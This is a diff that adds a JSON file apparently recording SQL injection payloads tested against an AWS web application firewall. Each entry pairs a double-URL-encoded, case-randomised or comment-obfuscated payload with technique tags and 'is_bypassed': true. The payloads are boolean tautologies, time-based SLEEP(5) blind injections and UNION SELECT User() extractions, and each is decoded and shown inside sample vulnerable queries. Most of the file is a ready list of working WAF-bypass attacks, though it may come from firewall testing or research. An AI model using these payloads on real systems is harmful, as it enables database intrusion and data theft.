@@ -1,0 +1,1558 @@
+[
+    {
+        "payload": "1%26%2347%3b%25252a%25252a%26%2347%3bor%26%2347%3b%25252a%25252a%26%2347%3b1%25253d1",
+        "technique": "Boolean-based Blind_full_bypass+obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "1/**/or/**/1=1",
+            "safe_queries": [
+                "SELECT * FROM users WHERE username = '1/**/or/**/1=1'",
+                "SELECT * FROM users WHERE email = '1/**/or/**/1=1' AND active = 1"
+            ],
+            "harm_queries": [
+                "SELECT * FROM users WHERE id = 1/**/or/**/1=1",
+                "SELECT * FROM orders WHERE amount > 1/**/or/**/1=1 AND active = 1",
+                "SELECT * FROM users ORDER BY 1/**/or/**/1=1",
+                "SELECT * FROM users ORDER BY 1/**/or/**/1=1 DESC",
+                "SELECT * FROM users WHERE 1/**/or/**/1=1 IS NOT NULL",
+                "SELECT 1/**/or/**/1=1 FROM users"
+            ],
+            "error_queries": [
+                "SELECT * FROM users LIMIT 1/**/or/**/1=1",
+                "SELECT * FROM products LIMIT 10 OFFSET 1/**/or/**/1=1",
+                "SELECT * FROM orders LIMIT 1/**/or/**/1=1 OFFSET 0",
+                "SELECT * FROM 1/**/or/**/1=1 WHERE active = 1",
+                "SELECT * FROM users ORDER BY id 1/**/or/**/1=1"
+            ]
+        }
+    },
+    {
+        "payload": "%252527%252520and%252520%252528SelEct%2525201%252520FRom%252520%252528sELEcT%252528SLeeP%2525285%252529%252529%252529a%252529--%252520",
+        "technique": "obf_double_url_encode+obf_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "' and (SelEct 1 FRom (sELEcT(SLeeP(5)))a)-- ",
+            "safe_queries": [],
+            "harm_queries": [
+                "SELECT * FROM users WHERE username = '' and (SelEct 1 FRom (sELEcT(SLeeP(5)))a)-- '",
+                "SELECT * FROM users WHERE email = '' and (SelEct 1 FRom (sELEcT(SLeeP(5)))a)-- ' AND active = 1"
+            ],
+            "error_queries": [
+                "SELECT * FROM users WHERE id = ' and (SelEct 1 FRom (sELEcT(SLeeP(5)))a)-- ",
+                "SELECT * FROM orders WHERE amount > ' and (SelEct 1 FRom (sELEcT(SLeeP(5)))a)--  AND active = 1",
+                "SELECT * FROM users LIMIT ' and (SelEct 1 FRom (sELEcT(SLeeP(5)))a)-- ",
+                "SELECT * FROM products LIMIT 10 OFFSET ' and (SelEct 1 FRom (sELEcT(SLeeP(5)))a)-- ",
+                "SELECT * FROM orders LIMIT ' and (SelEct 1 FRom (sELEcT(SLeeP(5)))a)--  OFFSET 0",
+                "SELECT * FROM users ORDER BY ' and (SelEct 1 FRom (sELEcT(SLeeP(5)))a)-- ",
+                "SELECT * FROM users ORDER BY ' and (SelEct 1 FRom (sELEcT(SLeeP(5)))a)--  DESC",
+                "SELECT * FROM ' and (SelEct 1 FRom (sELEcT(SLeeP(5)))a)--  WHERE active = 1",
+                "SELECT * FROM users WHERE ' and (SelEct 1 FRom (sELEcT(SLeeP(5)))a)--  IS NOT NULL",
+                "SELECT ' and (SelEct 1 FRom (sELEcT(SLeeP(5)))a)--  FROM users",
+                "SELECT * FROM users ORDER BY id ' and (SelEct 1 FRom (sELEcT(SLeeP(5)))a)-- "
+            ]
+        }
+    },
+    {
+        "payload": "%2527%2520UNiON%2520sELECT%25201%252CUser%2528%2529%252c3--%2520",
+        "technique": "Time-based Blind_full_bypass+obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass",
+        "attack_type": "sql_injection",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "' UNiON sELECT 1,User(),3-- ",
+            "safe_queries": [],
+            "harm_queries": [
+                "SELECT * FROM users WHERE username = '' UNiON sELECT 1,User(),3-- '",
+                "SELECT * FROM users WHERE email = '' UNiON sELECT 1,User(),3-- ' AND active = 1"
+            ],
+            "error_queries": [
+                "SELECT * FROM users WHERE id = ' UNiON sELECT 1,User(),3-- ",
+                "SELECT * FROM orders WHERE amount > ' UNiON sELECT 1,User(),3--  AND active = 1",
+                "SELECT * FROM users LIMIT ' UNiON sELECT 1,User(),3-- ",
+                "SELECT * FROM products LIMIT 10 OFFSET ' UNiON sELECT 1,User(),3-- ",
+                "SELECT * FROM orders LIMIT ' UNiON sELECT 1,User(),3--  OFFSET 0",
+                "SELECT * FROM users ORDER BY ' UNiON sELECT 1,User(),3-- ",
+                "SELECT * FROM users ORDER BY ' UNiON sELECT 1,User(),3--  DESC",
+                "SELECT * FROM ' UNiON sELECT 1,User(),3--  WHERE active = 1",
+                "SELECT * FROM users WHERE ' UNiON sELECT 1,User(),3--  IS NOT NULL",
+                "SELECT ' UNiON sELECT 1,User(),3--  FROM users",
+                "SELECT * FROM users ORDER BY id ' UNiON sELECT 1,User(),3-- "
+            ]
+        }
+    },
+    {
+        "payload": "%2527%2520and%2520%2528select%25201%2520from%2520%2528select%2528sleep%25285%2529%2529%2529A%2529--%2520",
+        "technique": "obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass",
+        "attack_type": "sql_injection",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "' and (select 1 from (select(sleep(5)))A)-- ",
+            "safe_queries": [],
+            "harm_queries": [
+                "SELECT * FROM users WHERE username = '' and (select 1 from (select(sleep(5)))A)-- '",
+                "SELECT * FROM users WHERE email = '' and (select 1 from (select(sleep(5)))A)-- ' AND active = 1"
+            ],
+            "error_queries": [
+                "SELECT * FROM users WHERE id = ' and (select 1 from (select(sleep(5)))A)-- ",
+                "SELECT * FROM orders WHERE amount > ' and (select 1 from (select(sleep(5)))A)--  AND active = 1",
+                "SELECT * FROM users LIMIT ' and (select 1 from (select(sleep(5)))A)-- ",
+                "SELECT * FROM products LIMIT 10 OFFSET ' and (select 1 from (select(sleep(5)))A)-- ",
+                "SELECT * FROM orders LIMIT ' and (select 1 from (select(sleep(5)))A)--  OFFSET 0",
+                "SELECT * FROM users ORDER BY ' and (select 1 from (select(sleep(5)))A)-- ",
+                "SELECT * FROM users ORDER BY ' and (select 1 from (select(sleep(5)))A)--  DESC",
+                "SELECT * FROM ' and (select 1 from (select(sleep(5)))A)--  WHERE active = 1",
+                "SELECT * FROM users WHERE ' and (select 1 from (select(sleep(5)))A)--  IS NOT NULL",
+                "SELECT ' and (select 1 from (select(sleep(5)))A)--  FROM users",
+                "SELECT * FROM users ORDER BY id ' and (select 1 from (select(sleep(5)))A)-- "
+            ]
+        }
+    },
+    {
+        "payload": "1%26id%3Dadmin'%27 %20-- 48 -- OK /*95*/",
+        "technique": "Union Select Null Bytes_adv_obf_full_bypass",
+        "attack_type": "sql_injection",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": false,
+        "harmness": {
+            "payload": "1&id=admin''  -- 48 -- OK /*95*/",
+            "safe_queries": [
+                "SELECT * FROM users WHERE username = '1&id=admin''  -- 48 -- OK /*95*/'",
+                "SELECT * FROM users WHERE email = '1&id=admin''  -- 48 -- OK /*95*/' AND active = 1"
+            ],
+            "harm_queries": [],
+            "error_queries": [
+                "SELECT * FROM users WHERE id = 1&id=admin''  -- 48 -- OK /*95*/",
+                "SELECT * FROM orders WHERE amount > 1&id=admin''  -- 48 -- OK /*95*/ AND active = 1",
+                "SELECT * FROM users LIMIT 1&id=admin''  -- 48 -- OK /*95*/",
+                "SELECT * FROM products LIMIT 10 OFFSET 1&id=admin''  -- 48 -- OK /*95*/",
+                "SELECT * FROM orders LIMIT 1&id=admin''  -- 48 -- OK /*95*/ OFFSET 0",
+                "SELECT * FROM users ORDER BY 1&id=admin''  -- 48 -- OK /*95*/",
+                "SELECT * FROM users ORDER BY 1&id=admin''  -- 48 -- OK /*95*/ DESC",
+                "SELECT * FROM 1&id=admin''  -- 48 -- OK /*95*/ WHERE active = 1",
+                "SELECT * FROM users WHERE 1&id=admin''  -- 48 -- OK /*95*/ IS NOT NULL",
+                "SELECT 1&id=admin''  -- 48 -- OK /*95*/ FROM users",
+                "SELECT * FROM users ORDER BY id 1&id=admin''  -- 48 -- OK /*95*/"
+            ]
+        }
+    },
+    {
+        "payload": "%2527%2520UnIon%2520selECT%25201%252CuSER%2528%2529%252C3--%2520",
+        "technique": "obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass+obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass",
+        "attack_type": "sql_injection",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "' UnIon selECT 1,uSER(),3-- ",
+            "safe_queries": [],
+            "harm_queries": [
+                "SELECT * FROM users WHERE username = '' UnIon selECT 1,uSER(),3-- '",
+                "SELECT * FROM users WHERE email = '' UnIon selECT 1,uSER(),3-- ' AND active = 1"
+            ],
+            "error_queries": [
+                "SELECT * FROM users WHERE id = ' UnIon selECT 1,uSER(),3-- ",
+                "SELECT * FROM orders WHERE amount > ' UnIon selECT 1,uSER(),3--  AND active = 1",
+                "SELECT * FROM users LIMIT ' UnIon selECT 1,uSER(),3-- ",
+                "SELECT * FROM products LIMIT 10 OFFSET ' UnIon selECT 1,uSER(),3-- ",
+                "SELECT * FROM orders LIMIT ' UnIon selECT 1,uSER(),3--  OFFSET 0",
+                "SELECT * FROM users ORDER BY ' UnIon selECT 1,uSER(),3-- ",
+                "SELECT * FROM users ORDER BY ' UnIon selECT 1,uSER(),3--  DESC",
+                "SELECT * FROM ' UnIon selECT 1,uSER(),3--  WHERE active = 1",
+                "SELECT * FROM users WHERE ' UnIon selECT 1,uSER(),3--  IS NOT NULL",
+                "SELECT ' UnIon selECT 1,uSER(),3--  FROM users",
+                "SELECT * FROM users ORDER BY id ' UnIon selECT 1,uSER(),3-- "
+            ]
+        }
+    },
+    {
+        "payload": "%252527%252520and%252520%252528select%2525201%252520from%252520%252528select%252528sleep%2525285%252529%252529%252529A%252529--%252520",
+        "technique": "obf_double_url_encode+obf_url_encode_adv_obf_full_bypass+obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass+obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass",
+        "attack_type": "sql_injection",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "' and (select 1 from (select(sleep(5)))A)-- ",
+            "safe_queries": [],
+            "harm_queries": [
+                "SELECT * FROM users WHERE username = '' and (select 1 from (select(sleep(5)))A)-- '",
+                "SELECT * FROM users WHERE email = '' and (select 1 from (select(sleep(5)))A)-- ' AND active = 1"
+            ],
+            "error_queries": [
+                "SELECT * FROM users WHERE id = ' and (select 1 from (select(sleep(5)))A)-- ",
+                "SELECT * FROM orders WHERE amount > ' and (select 1 from (select(sleep(5)))A)--  AND active = 1",
+                "SELECT * FROM users LIMIT ' and (select 1 from (select(sleep(5)))A)-- ",
+                "SELECT * FROM products LIMIT 10 OFFSET ' and (select 1 from (select(sleep(5)))A)-- ",
+                "SELECT * FROM orders LIMIT ' and (select 1 from (select(sleep(5)))A)--  OFFSET 0",
+                "SELECT * FROM users ORDER BY ' and (select 1 from (select(sleep(5)))A)-- ",
+                "SELECT * FROM users ORDER BY ' and (select 1 from (select(sleep(5)))A)--  DESC",
+                "SELECT * FROM ' and (select 1 from (select(sleep(5)))A)--  WHERE active = 1",
+                "SELECT * FROM users WHERE ' and (select 1 from (select(sleep(5)))A)--  IS NOT NULL",
+                "SELECT ' and (select 1 from (select(sleep(5)))A)--  FROM users",
+                "SELECT * FROM users ORDER BY id ' and (select 1 from (select(sleep(5)))A)-- "
+            ]
+        }
+    },
+    {
+        "payload": "%2527%2520UNIon%2520selECT%25201%252CuSER%2528%2529%252C3--%2520",
+        "technique": "obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass+Boolean-based Blind_full_bypass+obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "' UNIon selECT 1,uSER(),3-- ",
+            "safe_queries": [],
+            "harm_queries": [
+                "SELECT * FROM users WHERE username = '' UNIon selECT 1,uSER(),3-- '",
+                "SELECT * FROM users WHERE email = '' UNIon selECT 1,uSER(),3-- ' AND active = 1"
+            ],
+            "error_queries": [
+                "SELECT * FROM users WHERE id = ' UNIon selECT 1,uSER(),3-- ",
+                "SELECT * FROM orders WHERE amount > ' UNIon selECT 1,uSER(),3--  AND active = 1",
+                "SELECT * FROM users LIMIT ' UNIon selECT 1,uSER(),3-- ",
+                "SELECT * FROM products LIMIT 10 OFFSET ' UNIon selECT 1,uSER(),3-- ",
+                "SELECT * FROM orders LIMIT ' UNIon selECT 1,uSER(),3--  OFFSET 0",
+                "SELECT * FROM users ORDER BY ' UNIon selECT 1,uSER(),3-- ",
+                "SELECT * FROM users ORDER BY ' UNIon selECT 1,uSER(),3--  DESC",
+                "SELECT * FROM ' UNIon selECT 1,uSER(),3--  WHERE active = 1",
+                "SELECT * FROM users WHERE ' UNIon selECT 1,uSER(),3--  IS NOT NULL",
+                "SELECT ' UNIon selECT 1,uSER(),3--  FROM users",
+                "SELECT * FROM users ORDER BY id ' UNIon selECT 1,uSER(),3-- "
+            ]
+        }
+    },
+    {
+        "payload": "%2527%2520anD%2520%2528seLecT%25201%2520frOM%2520%2528SeleCT%2528sleEp%25285%2529%2529%2529a%2529--%2520",
+        "technique": "obf_case_random+obf_double_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "' anD (seLecT 1 frOM (SeleCT(sleEp(5)))a)-- ",
+            "safe_queries": [],
+            "harm_queries": [
+                "SELECT * FROM users WHERE username = '' anD (seLecT 1 frOM (SeleCT(sleEp(5)))a)-- '",
+                "SELECT * FROM users WHERE email = '' anD (seLecT 1 frOM (SeleCT(sleEp(5)))a)-- ' AND active = 1"
+            ],
+            "error_queries": [
+                "SELECT * FROM users WHERE id = ' anD (seLecT 1 frOM (SeleCT(sleEp(5)))a)-- ",
+                "SELECT * FROM orders WHERE amount > ' anD (seLecT 1 frOM (SeleCT(sleEp(5)))a)--  AND active = 1",
+                "SELECT * FROM users LIMIT ' anD (seLecT 1 frOM (SeleCT(sleEp(5)))a)-- ",
+                "SELECT * FROM products LIMIT 10 OFFSET ' anD (seLecT 1 frOM (SeleCT(sleEp(5)))a)-- ",
+                "SELECT * FROM orders LIMIT ' anD (seLecT 1 frOM (SeleCT(sleEp(5)))a)--  OFFSET 0",
+                "SELECT * FROM users ORDER BY ' anD (seLecT 1 frOM (SeleCT(sleEp(5)))a)-- ",
+                "SELECT * FROM users ORDER BY ' anD (seLecT 1 frOM (SeleCT(sleEp(5)))a)--  DESC",
+                "SELECT * FROM ' anD (seLecT 1 frOM (SeleCT(sleEp(5)))a)--  WHERE active = 1",
+                "SELECT * FROM users WHERE ' anD (seLecT 1 frOM (SeleCT(sleEp(5)))a)--  IS NOT NULL",
+                "SELECT ' anD (seLecT 1 frOM (SeleCT(sleEp(5)))a)--  FROM users",
+                "SELECT * FROM users ORDER BY id ' anD (seLecT 1 frOM (SeleCT(sleEp(5)))a)-- "
+            ]
+        }
+    },
+    {
+        "payload": "1%2527/%252A%252a/OrDeR/%252AA%252a%252APBy_%2528sElecT%2520vsErsion%2528%2529%252C3-- /*64*/",
+        "technique": "Time-based Blind_full_bypass",
+        "attack_type": "sql_injection",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": false,
+        "harmness": {
+            "payload": "1'/**/OrDeR/*A**PBy_(sElecT vsErsion(),3-- /*64*/",
+            "safe_queries": [],
+            "harm_queries": [],
+            "error_queries": [
+                "SELECT * FROM users WHERE username = '1'/**/OrDeR/*A**PBy_(sElecT vsErsion(),3-- /*64*/'",
+                "SELECT * FROM users WHERE email = '1'/**/OrDeR/*A**PBy_(sElecT vsErsion(),3-- /*64*/' AND active = 1",
+                "SELECT * FROM users WHERE id = 1'/**/OrDeR/*A**PBy_(sElecT vsErsion(),3-- /*64*/",
+                "SELECT * FROM orders WHERE amount > 1'/**/OrDeR/*A**PBy_(sElecT vsErsion(),3-- /*64*/ AND active = 1",
+                "SELECT * FROM users LIMIT 1'/**/OrDeR/*A**PBy_(sElecT vsErsion(),3-- /*64*/",
+                "SELECT * FROM products LIMIT 10 OFFSET 1'/**/OrDeR/*A**PBy_(sElecT vsErsion(),3-- /*64*/",
+                "SELECT * FROM orders LIMIT 1'/**/OrDeR/*A**PBy_(sElecT vsErsion(),3-- /*64*/ OFFSET 0",
+                "SELECT * FROM users ORDER BY 1'/**/OrDeR/*A**PBy_(sElecT vsErsion(),3-- /*64*/",
+                "SELECT * FROM users ORDER BY 1'/**/OrDeR/*A**PBy_(sElecT vsErsion(),3-- /*64*/ DESC",
+                "SELECT * FROM 1'/**/OrDeR/*A**PBy_(sElecT vsErsion(),3-- /*64*/ WHERE active = 1",
+                "SELECT * FROM users WHERE 1'/**/OrDeR/*A**PBy_(sElecT vsErsion(),3-- /*64*/ IS NOT NULL",
+                "SELECT 1'/**/OrDeR/*A**PBy_(sElecT vsErsion(),3-- /*64*/ FROM users",
+                "SELECT * FROM users ORDER BY id 1'/**/OrDeR/*A**PBy_(sElecT vsErsion(),3-- /*64*/"
+            ]
+        }
+    },
+    {
+        "payload": "1%2509OR%25091%3D1",
+        "technique": "obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass+Union Select Null Bytes_adv_obf_full_bypass+Time-based Blind_full_bypass",
+        "attack_type": "sql_injection",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "1\tOR\t1=1",
+            "safe_queries": [
+                "SELECT * FROM users WHERE username = '1\tOR\t1=1'",
+                "SELECT * FROM users WHERE email = '1\tOR\t1=1' AND active = 1"
+            ],
+            "harm_queries": [
+                "SELECT * FROM users WHERE id = 1\tOR\t1=1",
+                "SELECT * FROM orders WHERE amount > 1\tOR\t1=1 AND active = 1",
+                "SELECT * FROM users ORDER BY 1\tOR\t1=1",
+                "SELECT * FROM users ORDER BY 1\tOR\t1=1 DESC",
+                "SELECT * FROM users WHERE 1\tOR\t1=1 IS NOT NULL",
+                "SELECT 1\tOR\t1=1 FROM users"
+            ],
+            "error_queries": [
+                "SELECT * FROM users LIMIT 1\tOR\t1=1",
+                "SELECT * FROM products LIMIT 10 OFFSET 1\tOR\t1=1",
+                "SELECT * FROM orders LIMIT 1\tOR\t1=1 OFFSET 0",
+                "SELECT * FROM 1\tOR\t1=1 WHERE active = 1",
+                "SELECT * FROM users ORDER BY id 1\tOR\t1=1"
+            ]
+        }
+    },
+    {
+        "payload": "1%252F%25252a%25252A%252For%252F%25252a%25252a%252FFrOm%252F%25252a%25252a%252F%252528sELeCT%2525201%252520FROm%252520%252528SelECt%252528sle",
+        "technique": "obf_case_random+obf_double_url_encode_adv_obf_full_bypass+Boolean-based Blind_full_bypass",
+        "attack_type": "sql_injection",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": false,
+        "harmness": {
+            "payload": "1/**/or/**/FrOm/**/(sELeCT 1 FROm (SelECt(sle",
+            "safe_queries": [
+                "SELECT * FROM users WHERE username = '1/**/or/**/FrOm/**/(sELeCT 1 FROm (SelECt(sle'",
+                "SELECT * FROM users WHERE email = '1/**/or/**/FrOm/**/(sELeCT 1 FROm (SelECt(sle' AND active = 1"
+            ],
+            "harm_queries": [],
+            "error_queries": [
+                "SELECT * FROM users WHERE id = 1/**/or/**/FrOm/**/(sELeCT 1 FROm (SelECt(sle",
+                "SELECT * FROM orders WHERE amount > 1/**/or/**/FrOm/**/(sELeCT 1 FROm (SelECt(sle AND active = 1",
+                "SELECT * FROM users LIMIT 1/**/or/**/FrOm/**/(sELeCT 1 FROm (SelECt(sle",
+                "SELECT * FROM products LIMIT 10 OFFSET 1/**/or/**/FrOm/**/(sELeCT 1 FROm (SelECt(sle",
+                "SELECT * FROM orders LIMIT 1/**/or/**/FrOm/**/(sELeCT 1 FROm (SelECt(sle OFFSET 0",
+                "SELECT * FROM users ORDER BY 1/**/or/**/FrOm/**/(sELeCT 1 FROm (SelECt(sle",
+                "SELECT * FROM users ORDER BY 1/**/or/**/FrOm/**/(sELeCT 1 FROm (SelECt(sle DESC",
+                "SELECT * FROM 1/**/or/**/FrOm/**/(sELeCT 1 FROm (SelECt(sle WHERE active = 1",
+                "SELECT * FROM users WHERE 1/**/or/**/FrOm/**/(sELeCT 1 FROm (SelECt(sle IS NOT NULL",
+                "SELECT 1/**/or/**/FrOm/**/(sELeCT 1 FROm (SelECt(sle FROM users",
+                "SELECT * FROM users ORDER BY id 1/**/or/**/FrOm/**/(sELeCT 1 FROm (SelECt(sle"
+            ]
+        }
+    },
+    {
+        "payload": "aDMiN%2527%252509--",
+        "technique": "obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "aDMiN'\t--",
+            "safe_queries": [
+                "SELECT * FROM users WHERE username = 'aDMiN'\t--'"
+            ],
+            "harm_queries": [
+                "SELECT * FROM users WHERE email = 'aDMiN'\t--' AND active = 1"
+            ],
+            "error_queries": [
+                "SELECT * FROM users WHERE id = aDMiN'\t--",
+                "SELECT * FROM orders WHERE amount > aDMiN'\t-- AND active = 1",
+                "SELECT * FROM users LIMIT aDMiN'\t--",
+                "SELECT * FROM products LIMIT 10 OFFSET aDMiN'\t--",
+                "SELECT * FROM orders LIMIT aDMiN'\t-- OFFSET 0",
+                "SELECT * FROM users ORDER BY aDMiN'\t--",
+                "SELECT * FROM users ORDER BY aDMiN'\t-- DESC",
+                "SELECT * FROM aDMiN'\t-- WHERE active = 1",
+                "SELECT * FROM users WHERE aDMiN'\t-- IS NOT NULL",
+                "SELECT aDMiN'\t-- FROM users",
+                "SELECT * FROM users ORDER BY id aDMiN'\t--"
+            ]
+        }
+    },
+    {
+        "payload": "%252527%252520and%252520%252528SeLeCt%2525201%252520FROm%252520%252528sELEct%252528SlEeP%2525285%252529%252529%252529A%252529--%252520",
+        "technique": "obf_double_url_encode+obf_url_encode_adv_obf_full_bypass+obf_case_random+obf_double_url_encode_adv_obf_full_bypass+Boolean-based Blind_full_bypass+obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "' and (SeLeCt 1 FROm (sELEct(SlEeP(5)))A)-- ",
+            "safe_queries": [],
+            "harm_queries": [
+                "SELECT * FROM users WHERE username = '' and (SeLeCt 1 FROm (sELEct(SlEeP(5)))A)-- '",
+                "SELECT * FROM users WHERE email = '' and (SeLeCt 1 FROm (sELEct(SlEeP(5)))A)-- ' AND active = 1"
+            ],
+            "error_queries": [
+                "SELECT * FROM users WHERE id = ' and (SeLeCt 1 FROm (sELEct(SlEeP(5)))A)-- ",
+                "SELECT * FROM orders WHERE amount > ' and (SeLeCt 1 FROm (sELEct(SlEeP(5)))A)--  AND active = 1",
+                "SELECT * FROM users LIMIT ' and (SeLeCt 1 FROm (sELEct(SlEeP(5)))A)-- ",
+                "SELECT * FROM products LIMIT 10 OFFSET ' and (SeLeCt 1 FROm (sELEct(SlEeP(5)))A)-- ",
+                "SELECT * FROM orders LIMIT ' and (SeLeCt 1 FROm (sELEct(SlEeP(5)))A)--  OFFSET 0",
+                "SELECT * FROM users ORDER BY ' and (SeLeCt 1 FROm (sELEct(SlEeP(5)))A)-- ",
+                "SELECT * FROM users ORDER BY ' and (SeLeCt 1 FROm (sELEct(SlEeP(5)))A)--  DESC",
+                "SELECT * FROM ' and (SeLeCt 1 FROm (sELEct(SlEeP(5)))A)--  WHERE active = 1",
+                "SELECT * FROM users WHERE ' and (SeLeCt 1 FROm (sELEct(SlEeP(5)))A)--  IS NOT NULL",
+                "SELECT ' and (SeLeCt 1 FROm (sELEct(SlEeP(5)))A)--  FROM users",
+                "SELECT * FROM users ORDER BY id ' and (SeLeCt 1 FROm (sELEct(SlEeP(5)))A)-- "
+            ]
+        }
+    },
+    {
+        "payload": "%2527%2520AND%2520%2528SELECT%25201%2520FROM%2520%2528SELECT%2528SLEEP%25285%2529%2529%2529a%2529--%2520",
+        "technique": "obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass",
+        "attack_type": "sql_injection",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- ",
+            "safe_queries": [],
+            "harm_queries": [
+                "SELECT * FROM users WHERE username = '' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- '",
+                "SELECT * FROM users WHERE email = '' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- ' AND active = 1"
+            ],
+            "error_queries": [
+                "SELECT * FROM users WHERE id = ' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- ",
+                "SELECT * FROM orders WHERE amount > ' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--  AND active = 1",
+                "SELECT * FROM users LIMIT ' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- ",
+                "SELECT * FROM products LIMIT 10 OFFSET ' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- ",
+                "SELECT * FROM orders LIMIT ' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--  OFFSET 0",
+                "SELECT * FROM users ORDER BY ' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- ",
+                "SELECT * FROM users ORDER BY ' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--  DESC",
+                "SELECT * FROM ' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--  WHERE active = 1",
+                "SELECT * FROM users WHERE ' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--  IS NOT NULL",
+                "SELECT ' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--  FROM users",
+                "SELECT * FROM users ORDER BY id ' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- "
+            ]
+        }
+    },
+    {
+        "payload": "%2527%2520uNiON%2520SELect%25201%252cUser%2528%2529%252C3--%2520",
+        "technique": "obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass",
+        "attack_type": "sql_injection",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "' uNiON SELect 1,User(),3-- ",
+            "safe_queries": [],
+            "harm_queries": [
+                "SELECT * FROM users WHERE username = '' uNiON SELect 1,User(),3-- '",
+                "SELECT * FROM users WHERE email = '' uNiON SELect 1,User(),3-- ' AND active = 1"
+            ],
+            "error_queries": [
+                "SELECT * FROM users WHERE id = ' uNiON SELect 1,User(),3-- ",
+                "SELECT * FROM orders WHERE amount > ' uNiON SELect 1,User(),3--  AND active = 1",
+                "SELECT * FROM users LIMIT ' uNiON SELect 1,User(),3-- ",
+                "SELECT * FROM products LIMIT 10 OFFSET ' uNiON SELect 1,User(),3-- ",
+                "SELECT * FROM orders LIMIT ' uNiON SELect 1,User(),3--  OFFSET 0",
+                "SELECT * FROM users ORDER BY ' uNiON SELect 1,User(),3-- ",
+                "SELECT * FROM users ORDER BY ' uNiON SELect 1,User(),3--  DESC",
+                "SELECT * FROM ' uNiON SELect 1,User(),3--  WHERE active = 1",
+                "SELECT * FROM users WHERE ' uNiON SELect 1,User(),3--  IS NOT NULL",
+                "SELECT ' uNiON SELect 1,User(),3--  FROM users",
+                "SELECT * FROM users ORDER BY id ' uNiON SELect 1,User(),3-- "
+            ]
+        }
+    },
+    {
+        "payload": "%2527%252509and%252509%2528select%2525091%252509from%252509%2528select%2528sleep%25285%2529%2529%2529A%2529--%252509BD3AB46FFBDCBFDBEAEFECBC1FDEABFAEBFC5DDAE%252509",
+        "technique": "obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass+Time-based Blind_full_bypass+obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass+obf_double_url_encode+obf_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "'\tand\t(select\t1\tfrom\t(select(sleep(5)))A)--\tBD3AB46FFBDCBFDBEAEFECBC1FDEABFAEBFC5DDAE\t",
+            "safe_queries": [],
+            "harm_queries": [
